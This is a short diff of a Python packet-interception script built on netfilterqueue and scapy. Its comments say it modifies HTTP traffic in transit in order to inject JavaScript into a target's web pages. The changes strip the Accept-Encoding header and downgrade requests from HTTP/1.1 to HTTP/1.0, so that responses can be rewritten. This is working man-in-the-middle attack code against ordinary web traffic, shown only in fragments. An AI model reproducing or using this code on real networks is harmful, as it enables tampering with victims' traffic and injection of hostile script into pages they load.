@@ -1,6 +1,6 @@
 #!usr/bin/env python
 
-#Here we are trying to capture the data from the target client and tries to inject the code. 
+#Here we are trying to modify the data in the raw layer. Precisely we are modifying the HTML code and try to inject tghe javascript code 
 
 import netfilterqueue
 import scapy.all as scapy
@@ -27,6 +27,7 @@ def process_packet(packet):
           
           print("[+]requests")
           load = re.sub("Accept-encoding=.*?\\r\\n"," ",load)   # removing accept encoding using regex
+          load = load.replace("HTTP/1.1", "HTTP/1.0")  #HTTPS pages
           
 
        elif scapy_packet[scapy.TCP].sport == 80:   #HTTP responses
